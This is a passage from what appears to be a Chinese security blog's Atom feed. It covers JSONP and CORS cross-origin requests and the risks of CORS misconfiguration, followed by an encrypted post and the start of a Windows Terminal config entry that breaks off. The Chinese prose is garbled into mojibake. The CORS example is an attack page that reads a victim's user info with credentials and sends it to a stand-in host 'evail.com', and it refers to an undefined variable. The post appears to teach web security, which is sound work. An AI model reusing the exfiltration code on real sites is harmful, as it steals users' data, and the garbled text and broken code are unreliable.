é“¶è¡Œå¡å·ä¹‹ç±»çš„ä¸ªäººæ•æ„Ÿä¿¡æ¯ä¸€èˆ¬åªä¿ç•™å…¶ä¸­çš„å‡ ä¸ªå­—ç¬¦ï¼Œå…¶ä»–ç”¨*å·ä»£æ›¿ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span>(<span class="params">msg</span>)</span>&#123;      </span><br><span class="line">   <span class="comment">//alert(msg);        </span></span><br><span class="line">   do_evilSomething();<span class="comment">//å‘é€æ•æ„Ÿæ•°æ®  &#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src =http:/</span><span class="regexp">/b.com/g</span>etinfo?callback=jsonp_callback type=<span class="string">"text/javascript"</span> &gt; <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>ä¸å¾—ä¸æåˆ°ï¼ŒJSONPè·¨åŸŸæ•°æ®ä¼ è¾“åªèƒ½é€šè¿‡GETæ–¹å¼ï¼Œä¸‹é¢å†ä»‹ç»å¦å¤–ä¸€ç§è·¨åŸŸæ–¹æ³•â€”CORSã€‚</p><hr><h2 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h2><p>&emsp;&emsp; æˆ‘ä»¬å¸¸è¯´çš„è·¨åŸŸèµ„æºå…±äº«(CORS) æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå®ƒä½¿ç”¨é¢å¤–çš„ HTTP å¤´æ¥å‘Šè¯‰æµè§ˆå™¨è®©è¿è¡Œåœ¨ä¸€ä¸ª origin (domain) ä¸Šçš„Webåº”ç”¨è¢«å‡†è®¸è®¿é—®æ¥è‡ªä¸åŒæºæœåŠ¡å™¨ä¸Šçš„æŒ‡å®šçš„èµ„æºã€‚å½“ä¸€ä¸ªèµ„æºä»ä¸è¯¥èµ„æºæœ¬èº«æ‰€åœ¨çš„æœåŠ¡å™¨ä¸åŒçš„åŸŸã€åè®®æˆ–ç«¯å£è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œèµ„æºä¼šå‘èµ·ä¸€ä¸ªè·¨åŸŸ HTTP è¯·æ±‚ã€‚ä½†æ˜¯æµè§ˆå™¨å†³å®šæ˜¯å¦é˜»æ–­æ­¤æ¬¡è¯·æ±‚æ˜¯è¦çœ‹è¢«è·¨åŸŸè¯·æ±‚çš„ç½‘ç«™ï¼ˆb.comï¼‰çš„è¿”å›å¤´headerä¸­æ˜¯å¦åŒ…å«â€œæˆæƒè®¿é—®æ ‡å¤´â€â€”Access-Control-Allow-Originã€‚</p><p>ä¸€ä¸ªcorsè¯·æ±‚ä»£ç ç¤ºä¾‹ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20200515155329679.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200515155343926.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; å“åº”ä¸­å“åº”é¦–éƒ¨å­—æ®µ Access-Control-Allow-Origin: * è¡¨æ˜ï¼Œè¯¥èµ„æºå¯ä»¥è¢«ä»»æ„å¤–åŸŸè®¿é—®ã€‚å¦‚æœæœåŠ¡ç«¯ä»…å…è®¸æ¥è‡ª <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> çš„è®¿é—®ï¼Œè¯¥é¦–éƒ¨å­—æ®µçš„å†…å®¹å¦‚ä¸‹ï¼šAccess-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> ã€‚</p><p>&emsp;&emsp; å½“ç„¶è¿™æ¬¡è¯·æ±‚ä¼šæˆåŠŸï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŠŠä¸Šé¢çš„ä»£ç ç‰‡æ®µä¸­:<br>xmlhttp.setRequestHeader(â€œContent-Typeâ€,â€application/jsonâ€);<br>æˆ‘ä»¬ä¼šå‘ç°æµè§ˆå™¨ä¼šå¤šä¸€æ­¥æ“ä½œå°±æ˜¯å…ˆå‘é€ä¸€ä¸ª OPTIONSæ–¹æ³•è¯·æ±‚ï¼Œé€šå¸¸ä¹Ÿç§°ä¸ºé¢„è¯·æ±‚ã€‚ç«ç‹ç­‰æµè§ˆå™¨è§„å®šæ˜¯ä»¥ä¸‹æƒ…å†µçš„è¯·æ±‚éœ€è¦å…ˆè¿›è¡Œâ€œé¢„æ£€â€ã€‚<br>&emsp;&emsp; å½“è¯·æ±‚æ»¡è¶³ä¸‹è¿°ä»»ä¸€æ¡ä»¶æ—¶ï¼Œå³åº”é¦–å…ˆå‘é€é¢„æ£€è¯·æ±‚ï¼š<br>Content-Type çš„å€¼ä¸å±äºä¸‹åˆ—ä¹‹ä¸€:</p><blockquote><p>application/x-www-form-urlencoded<br>multipart/form-data<br>text/plain</p></blockquote><p>&emsp;&emsp; ä½¿ç”¨äº†ä¸‹é¢ä»»ä¸€ HTTP æ–¹æ³•ï¼š<code>PUT DELETE CONNECT OPTIONS TRACE PATCH</code>ï¼Œè¿˜æœ‰äººä¸ºè®¾ç½®äº†å¯¹ CORS å®‰å…¨çš„é¦–éƒ¨å­—æ®µé›†åˆä¹‹å¤–çš„å…¶ä»–é¦–éƒ¨å­—æ®µç­‰ã€‚å¦‚æœéœ€è¦è·¨åŸŸè¯·æ±‚å¸¦ä¸Šè¢«è¯·æ±‚åŸŸçš„Cookieï¼Œåˆ™éœ€è¦å“åº”ä¸­å“åº”é¦–éƒ¨å­—æ®µï¼š<code>Access-Control-Allow-Credentials: true</code> ï¼Œä½†åŒæ—¶æµè§ˆå™¨ä¸ºäº†å®‰å…¨èµ·è§ï¼ŒåŒæ—¶å’Œ<code>Access-Control-Allow-Origin: *</code>ä½¿ç”¨è¯·æ±‚ä¼šè¢«ç›´æ¥é˜»æ–­ã€‚</p><h2 id="CORSä¸­å¼€å‘è¯¯é…ç½®æ‰€å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼š"><a href="#CORSä¸­å¼€å‘è¯¯é…ç½®æ‰€å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼š" class="headerlink" title="CORSä¸­å¼€å‘è¯¯é…ç½®æ‰€å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼š"></a>CORSä¸­å¼€å‘è¯¯é…ç½®æ‰€å¯¼è‡´çš„å®‰å…¨é—®é¢˜ï¼š</h2><p>ï¼ˆ1ï¼‰Access-Control-Allow-Origin è¯¯é…ç½®è·å–æ•æ„Ÿæ•°æ®<br>ä¸€èˆ¬æœ‰äº›åº”ç”¨ç¡®å®ä¸å…è®¸è·¨åŸŸï¼Œä½†è‹¥webä¸­é—´ä»¶ï¼ˆä¾‹å¦‚nginxï¼‰ä¸Šè¢«è¯¯é…ç½®ï¼ˆå°¤å…¶å’Œå…¶å®ƒåº”ç”¨ä½¿ç”¨åŒä¸€ä¸ªnginxåšåå‘ä»£ç†ã€add_header â€˜Access-Control-Allow-Originâ€™ $origin;ã€‘ï¼‰å°±ä¼šé€ æˆæœ¬çº§åº”ç”¨è¢«å¼ºåˆ¶å…è®¸è·¨åŸŸã€‚<br>(2ï¼‰æœ¬çº§åº”ç”¨å…è®¸è·¨åŸŸï¼Œä½†ç¼–å†™æ­£åˆ™å¯ç»•è¿‡<br>(3)    ç»•è¿‡é¢„æ£€è¯·æ±‚çš„å†™æ“ä½œCSRF<br>&emsp;&emsp; å‡å¦‚åº”ç”¨Aä¸åº”ç”¨Bçš„æŸä¸ªæ¥å£ä¹‹é—´(æ•°æ®ä¼ è¾“ä½¿ç”¨jsonæ ¼å¼)å­˜åœ¨è·¨åŸŸèµ„æºå…±äº«ï¼Œä½†åº”ç”¨Bæœªæ ¡éªŒContent-Typeï¼Œå› æ­¤å¯é€šè¿‡XMLHttpRequestè®¾ç½®<code>Content-Typeä¸º&quot;text/plain&quot;</code>ç»•è¿‡é¢„æ£€è¯·æ±‚<br>&emsp;&emsp; æºå¸¦cookieå‘é€è¯·æ±‚æŠ¥æ–‡åˆ°Bçš„æœåŠ¡ç«¯ã€‚ï¼ˆè‹¥æµè§ˆå™¨å‘ç°Bè¿”å›çš„æŠ¥æ–‡å¤´æ²¡æœ‰<code>Access-Control-Allow-Origin</code>å’Œ<code>Access-Control-Allow-Credentials: true</code>å­—æ®µï¼Œåˆ™ä¸å…è®¸è¯»å–è¿”å›çš„æ•°æ®ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonreq</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"https://www.b.com/getuserinfo"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"text/plain"</span>);<span class="comment">//æ³¨æ„è¿™é‡Œ</span></span><br><span class="line">xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">var</span> res= xhr.responseText; <span class="comment">// è¯»å–è¿”å›çš„æ•°æ® </span></span><br><span class="line">location=<span class="string">'http://evail.com?param='</span>+res; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ï»¿# ç¬¬ä¸€æœŸ&lt;/p&gt;
&lt;h2 id=&quot;é€»è¾‘æ¼æ´æŒ–æ˜&quot;&gt;&lt;a href=&quot;#é€»è¾‘æ¼æ´æŒ–æ˜&quot; class=&quot;headerlink&quot; title=&quot;é€»è¾‘æ¼æ´æŒ–æ˜&quot;&gt;&lt;/a&gt;é€»è¾‘æ¼æ´æŒ–æ˜&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp; é€»è¾‘æ¼æ´ä¸­çš„è®¤è¯ç¼ºå¤±å’Œè®¤è¯ç¼ºé™·æ¼æ´ï¼Œä¸»è¦æŒ‡åŠŸèƒ½çº§è®¿é—®æ§
      
    
    </summary>
    
    
      <category term="ç¬”è®°" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>è®°ä¸€æ¬¡é¢è¯•é¢˜</title>
    <link href="https://summersec.github.io/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>https://summersec.github.io/2020/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
    <published>2020-07-15T11:01:42.000Z</published>
    <updated>2020-11-01T15:34:30.071Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="bbade943b565fb416235f91f8fe345a8046f20e7a1d95c59660dd70631f19ca2">ed9922697a085d1821237be7dd773a3c60e2869651829dd0f3831e347be01f9e22a6d1e618a654b28666abfbb50c8115803fd41338ea2726c27e87d6d45e78147d43c66b013339106d9dbce2fb5d1be3dfd3aecce6abc3c773484f38a6f96e197fd812aba9771fc48931b4b443e52102b1e4750d9e4cc4cc08cca994414ad053dae388f3e115b5f69b8883cfdf334053a50920a6cd3487fb2ffce0112719335ee7ed33f716c08ba7ae971beac318bb19f62a2f2dd2c7c49954efbd566128e34166cb7b2881bff3c915f031c5b7bc121f9cfb11cbf500f00a4b9cb1204e22760b8dd368a9280e9cead7da72e26b16863b2552fb1664810bf22a76c9a0c931911ceeef4142471a136313fba67467d595e22718a8d32164dbb8eab2591f7c53f5503e0825fd50ee70670e343b17039b3c618d2bd16903849c9416da359209c695376ca80240a28b17142b4cc08bd2a1094d1d6e835d8302f3b5649fb1f614360e7df6fb3ab7f00d78bbfe458399cb59560aa2fc2df916efd1b57e917ec588c02826d8df0f64dbeb0d363189c72f0abda3869ae6de882d232a1b3e0f6e7a1c5c67f62c03689b9d4d634d4e51a912c2b425f568c904423a4eabb1fb583c312f4b6d8ccfaa001c01c07cf943f867fac106ed46200565351cb35b20dd10aed7ce6f733df7d2042778fdcad23bdd6627fe9256af213ed7245f100895e765decfb292c464e06497a340f79407ad8deeb77fea113d0684501cb658e6a136e7cb2f19518db1c4c07511c9c9f45ede6422a0275a5e0b3b0c3f9e88f0f33aa3f78ed8dcbc3f9d36863933772efcb261c924a4cd2ede6d22327b019cda540b470cb4e620b04b35503b23786bc2584fa3780f833e2c31dfe17a5dd76d39ce09ca710e6c7175319367315557eac603c90ac6c2c2bea67d1adaf412740d58f3d4591f58356306c905a5de754638db864f21826693c2d1a9387b20d20433b6c6e893a0985e167228725003cc1cd0aa9c07db4ec0f42b1b10d8fcfc22c85c51f02570234de52d2056fdd9f40094a231bcab93029d93fe841e6748271e5fa84fe3e9716de6e66a07bf06d2e5e3ab8ed58852e56f5fa460caeb16b1f6dbdb566db19c4e0d49e578b5cc8203e57d63baa552fd9fd338d5bc76dc5c4e6656c86c0b65be176d906cccaeeb47f8767c58dcab14df8bb64efcc0f8828d64d1d889cd96d8e223e04b20a5af2a8eacebafc84a6005e3cc1f9d362e73d7a4089eae797b6e612d78fb16e62b4c2e2b1e01c01e706d8693c476b51978165fcca83bb04f12420e210cc6829ef3452d9b0976ba5e3f58c5b4435410eff2fe12026168f7a11136af99631fb6ce76a29dc6d50a19fc286018b7f76fb1e6e109e7bc0e2b5deb9393e8b6f5b8389681b19ebf0ee7a927a244a18183ff4528b45af54564c62446b4497abb2bf22036272c2dbe743ccc9d141c38a5a7b094204a4e7fd0de1ca027ac4d81a7935d4aa204142dab6e6bf5d86a9438a63091479da5291deca0d4d7ec39f6753a2eb0af47ce4ee238d7f0ef966d0e2ff5b1a41634369b356da14fe615b364f8e8c844b31b012a236bf4c7b24480305e16ca6f220c9088100d3e9468c10fe5500a84f394ef781600c8bcd1aad6e82ab82f1e291bb47d270636894fafc0e14c276004c02ae5955bfcfa89999c8a81cc366801a6f6dd920c8e8b3fd0a9e2310667983755609ed28db611a4ed92ea2785ddf7b52be21537e17c01c3b4cf78c38e5311e9b018b9fd516b060d6150390bd9d17c4fec48954db84a99133622872e10574feb6edfc1a2435456699cdc19dfa1045c14d4381a25f804f3753dca30662d35ff3c2fc6dccfd118c85ffdc7cbac130336da2f6911baf913348c3292611ef74e0b5c0596c07e638da463629ce4318325e283b2f2d3448894051fab456d029415261d21fd0efba40cd9ad12719f62dc582707509a2da649f50f11421435894af764d0947ee61da7bb3b6dd42fd0771cb64b782d014396c5d7b7d5db6a87cb01d7a2d30955451d8401a1b9a6614addbabe828d76c2eed7806378bb6255a3cbe380fb867d2c50a15fb33a1705ee7aa9892e3d80f6b22b4bc3799c0d223a9c197b24690f06833f4f76fdd195209982d1e343bb5e1fc2a4cc155fc510616ba54144afd7fbb1ab2a63dcd413fdae497bb4b8d3823bc889a6503685120df5713bc3fea37f954809ff2943f7141b85ef86216c456e61da08f111118bf98f286955401fde88635d55f060bbbdd917d884c655c44e15878f4712e6fc0a133a33f9d56cc0c2e87c4850662c2403b273564aafb93092cb37606bd71927cfeb48e97ae690ef0d81c7f0d0677edbd3cc8c1524df4de1e9fd58cc5ad056b98f8012c3246f18e5c9165da6c184f3c8177fd96783825b6b6eac333ef73a1e7c6e9b304d1910c10e87d932e97cdc5cb1c200e34b6261c425b0b5481c82834c12a9e7d57592dfd5fee96048262118cced1c352973a8cdb1f34850cf574a882371e87328b0d5f5226cbadc05b43be91add3478734d884e98ba873aa1eb8c448a092259edceb96b2b2d4f227eeb260b9644bd91cb5fdeb04aa70bc783781b4256179479ddb7e204d1f4c89cf0c229bc8e9ad75a7e0f4eb8683e8dfeda1e731a3ff1ba00ce1f5c6f4387165fb7dad53559681c038454f869bf82bdad0334fd6e9c1c3847144fe59fc4be87cdfc6eb6e1395c878652e12ddcc36b28125d8e0be02c6fe011ffd393d642d0b797b2f8e6e9fb446136ce871082dcb733c0b6e8348c94e69a38545c40e95c72db46610d83fd8011bd7d34e28b324b9e380a5884de268cd8aef97636e388f24cdb00242e6b222d4a1bf8453caa6deafd48c85c56283109db4b207f79218b0515d01ce1d5945e84b3711cfc553a4e07905c5ee9c21da14bd291179c8b0ac4153e9da93c5753d653f469d1bad1cb7f24c34d0ee4f9fa811ef6db503862e89fe232368ae0ca7bc92f23ad0306d151f126f182d840e031d957d3135a1cbb5a0226af2b30cc307e7d464aa204495761d114c571ec09a326695b138df42f11615fc2fa95b376ebcab707b214978ac39ea3e4766e7aad154ac8f21a8217f47c4a5bed05b6c366e807b5de27375d01ddf44fe20c35fb9061628c1e572858d5819e55ab542c1447006bd1809d3dafd1362d8c870ea5395791df2c2bcd2447471c7e67f3ebbe9e9553dfc2ab0f7e3e1dca7d9f89c1c1e1253a60537e4f62c5bf492e25f84bda93a49fbb881ec390df58b405f42c4492e48c8fcdc14722cdb01f7eafc0bc1974d6dd4b29953a3da4d7f44625cba3cff913d1ac09ffb2dc67792db14a52302546d0d12b3fff8b75bb1c9878475138201786a61f3f029418f69d2b2ec68386e8564f983db484ba163cb937daecd5e1302f4bc7fcd1749dcdfc82b4b4a3d350531124631c73b404ee6a3fbff989c3e5d73d78a49ce5dd7342ff70caa1116aedd9efdadb57ebf58591e34dab7962354e3c00fb84d2b672a4a709ebbe6e426dfa20e57242312c41557abf0e8a415d99cf8fa6b9583302c15fede7eb6357a5402f9091c6a4e991b5878788e6b302503a974d49bfe96d783ffca71d7f0fb51056690c0a33f70bde2bed1fc8682c12e8101d6f31eb9aa971d9e282d0975bccbf20797f8a66199c88a3a4aa892c8ad0c46f8febf541c67915eaf018b055a594478c1356b9b6258faebfc4728beba5fa2e7c7311f7c7daa75c6b8f8dbfa7b42e46323a3cd8c021bd619df0a65647beec3386fda9ca40b73b659bb5b27dab1dd9692c89406cfd773cc06af972d1055dfaa4c67ad880dff22d79569a5e8f7476a4e1cdf4f336b88980a507dbe5baff5f837dbb175dc4690af3106fdc523353129a1e804d62de7248b529c886249b2d45713514bf810728ddbb6ba39f5b262e2f141f09c659c7060ac727b1bfab53731e113de5a4188ab0a8e7d5c673584dc6d2e8c774ed61813ada7883ef2fcc5e157688c15e65661bd7315725f8c231462f724c8cd0d30437c6bc6958e938a20ce99afd72031442422390e07755e881c66167218b4dde2fd75427de956757839f9fa0106b8e2941340152635b607dbbadfe5262fdcce310fae0ca81b5a792d484e7f6f84075aa14e33e8e2e0a9aaf4dd1daf119e4c925b3141675cc02cb18a6b9af6d4f13d453852584d09f9a1e82615651d5d16ec5ce15c392a3578171ee84470c4b76ea21618541450dc6be0d1b8a271f64305ce8969eafea81288da73e6a4fa70847901fc243df8cd1fc39bbc62a9c79ac88536a2a3802aa55c66d4625e62fdb722247784642f2e0c8083a8873e2202029fa8bbc551cb58701108ba5c95a9a89de57c950e138bc95126f36a332c2551ed57f16e5ea5bc1d86b1616ac38f131bd4b74dc9a2633d83cc1e2587a5652bb92578339ac0d686803edb25fd62fbfae7cec6027863809adb6a5acf47ead92ff7e996deb34782c9f8e8ef61f05070727e2b5d106a0519299a0a0c56be8680886e8b2acd58d9dc6aa69c336d48ca04cc5a6c7090bab1a59b3fb4fb750d320c7a35964260a4fe9547a842f413549d1d3ad46750984081030793eb75f08de55e96ece8e22c364cdc9b1e26aca497e0808a4a9b678e1b651129972fc2997ffc52bad7c1d8a4a6ed5c4b8bff387a05acc8cdb64f7c530c00de2ab93b472e6fe834c4f65c14841d4cd04acd5aa6578ea26c3bd35d926757841c38e9928e42fbb7689a9651f6d2ca81d9bf08afb05dad0d82bbeba1b01dae8dc21340f95ddb56205db466640debca96f99578c8640ebc9a55063fa2391aba98827d11141b920826295c94f94b6e09823da7935518f3e241cc9bb549dc5266dd2869a5ed0ecf0a1a38e738e083ea73b0bd48579d156fda9c06288510a58016525fa4c2cc7b83b1a344fb724f5bff86095106dc8fa95c754eb7b334aa47707c46904af24133c3a39979a313dc700a0eac5c0930c75e4aa1a674e16788c23adc902a567113b6924526afd060bf43ed2f69fc12a290854e1b48913d134717d6d660e41264a20ca0c844a2e57942692dd117c72ed6e80cfa98c121e207a4962f403c8fb658bd26689b0a375a4d5a01ecda0233262a5d1dfbc1eeb214c90981fede825654dc275d891d9cff423e20b5ea0a190f805d971e79801972d2d8f249c6922d8c0f2d7c3647e3823c56733e8545b2c47b6ffb181558c365b9fdfe7a2496f78a296e5b9adbad507d656f75a3ea095a66b2de4918e23bfc0d8df3a19e6a8fa8ecd0da0ee0fbf9cc9b2254ea353c2d01fb514b5dae6c507602c1e25c3e09e84b2cc31d4284c24fd05c241dfc268cab7834df227b163f1fcfaaafb8f6f918cfc22272af81ddbcd61e3652c5cdf78c91d525d8bb48990a3cd881eea3e1ecdd56a2200854ab4275589cbcc6e3dd5871fb253aaf3f4bf263b6c1626a1d04b01a610adc9021543441382c2d82800f41df6fc314de21b5e02b4fa84b0b8e01845ccb3f54526a53d3fd9cee713aa96df2de6318250f06412cf92a0f88e970d4841efe4e71a07e833be70d08081611727a3d8181fbd0146fb0961b5c26d10178eb4ce328d7f63b95ed07d88a89f875557bcfcec8a083763e78b1abfdb2679890be7f483f2c5e60fd1e67ba580e9db1a34ebd227446e8966fdfe933d0faf05b7a5e10f9d7e26a023ebfbe3606090c2ceb7439347a81daf8ae44e46691ac6c6a709849d0bec7a1ffcaca44a030327e8e73860c14d312f50fc1391f150cde7c6fd32bdb590e9e59c3c19f98ff94f1af4feec2edb16043444aa023110ad8bc9569c54b6ba9d617b2fe4fa886fee571ffe693103d2036f111bdc495c6d74470fa2990990bdd4ed37eb7d8ee39891ceb788937b0fc440c78476a8ce4fb5d3b6717aef8a17b3ebbc5121380bf8f5fa641c8e5c9f3ff6d400ba08b39f8e8f53a10f3bb3f4983e485d83a3d9e59c6dcc24f70f3d1b28e299338f9b8c8b25321366cf94453482ed101a715914ce933b278de620e5e5893ad739f46f93170c7875510bae5fb9acb6d8819e2f762adafde4a49c3c5c9d5636c5a5d36f50e97ef5fe5362fadbb0e4d9fa095d6275f412b549fc8e8dd12df1b44b84ff2b093181527abf840efeb5617b341004d47325d800c086a740039ebf37ddd7a9ffcaf8427e3f175134d301870b7b85be904be39e8639caf2932e7b9b09b7463986c66070ccd20a1f7fcfe027275a6029bb48ba95f526a5581e4b408bf160e05c276b2c6ccd2d27a391426f7d8beb28f4a23a4736466d88b1d5152b82483829b14ab12a9b91bd415618a6b26a8ef0b449766032dbd57002bb40147b1e386cda04e3fb9950738ea69f1d927d5059d66858a3243f0850123cd9d6feb1cb13e838a67e51742f4aab0c0c9ad1b9876fa4938091b32aaa5ad5489a2e0f28f6d3de96b4a413c945257624f9490c2e6be8f430ffcb92fb58f5399e4706c00139b67a677d46d58db6bb9f93d9a255158cca973e82bfd2afdc4d5ff7359f47e62ad4d31af4e927ea07a55d275c7ad54123caaf079e5023e8ff9d6d7c4651a33012fc5e76518be0745e905abde3dd92e907facd35a9ed3dc88b0f0fe0c85137d5815f4f826087721328695137bb46fac9c643afc4167425749e1a14a8e5116e26afce7a094e78337de75458a279adc5539dd1cff59d3d5549f4318d2a492d76814dcb42b26716a2e5472aaa1fda43645b41cbbc6713549b18677a43f0ded19ee6f2b55d4b26b269f321be141477bf98a0f6e369fdf26ecc26342eadd439e80b1528ea0ce2cc2c3d4e54abb32fad7d572a5a2101f31e0d6d006df27fc272a3bf83128900780c5f4044f35252408aee6144d0bdbdda699b45619cd5f2b8f2a16a20f6294e703bfa436980af24c4d184c33cb0a6bd12d01ada691de2d821bca1b9c1324b8a16c6a9e362c7fa86b2a6fc5498a0c5c824f6b7543a8b50ad8f2a26f02d5257e5b236749cc0392df4917b3afe63a39f34930faae39f6a6e8fe171a420498322cdc9c6bba804e928d8feba7a392cc65220ee7b34f8b828b3fcb2c1ffc457b53191eebe09c979c0cc46903f54a2d8da7f6613bbc4549440b05b62c8300b5245511d65178354e4b45c1c9f3f3a1ddd1e69935a023d7a9e3109f12eacfb99337841d1d120815d9808c2dde0275a2e52964441f76feee591417127bdb820e358cbcfe8d08fc0666c21714e55d853ecf417697a65d6317e53569de8071c6c2fdd6b76d8e75f4a0716dda660c097034200b811096d321e6a219e25a46bf43d3476360ebccaacfd155c4ddfad39420ac0c6427a47c2d44363e00225ba2d4740447785d61e4a59e18cbddd0a613f10a2e17d5d941b7eab0f6cfc34c7f35b34e849e737fac1ccb6f12f785c229a729a6b1fe3eee54298ada395d3718ed9a2ba0377be7aa7d7be4d59ff7528b8d86190f2da22ebd43b2a5535106ecf3fe61fa9629e3feb6eaab89129d4bebfceb86807e29ef29e298f0ad32df1872550c39f9a4fec26f55da9a6ce6b2aeab2c2ed4dc1f28f3c251c4b6acafbf40969c989568b127535537f40e07757834f6ba2563d2399284f02a8831a0d5f9eced56d55947240e380aeb16e02c48ba583fa3de705fbd7ecaa58243029846af52858cbc0e7ef71419652b65e94ee7e94550fb430834fced972fe16fc079718f587b3d869a148a433ce4b6d698dc5ab944a04193c44fa8440b19333447f521a1064ef4425240d1023fd1e219d93990ce871758999d7e6757f0d51aa834a42404ce2fb0824366b1986a5805f6ddda935c69708006afc6b4fce6d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="ç¬”è®°" scheme="https://summersec.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows Terminal é…ç½®æ–‡ä»¶</title>
    <link href="https://summersec.github.io/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>https://summersec.github.io/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</id>
    <published>2020-07-01T11:01:42.000Z</published>
    <updated>2020-07-20T11:23:17.882Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 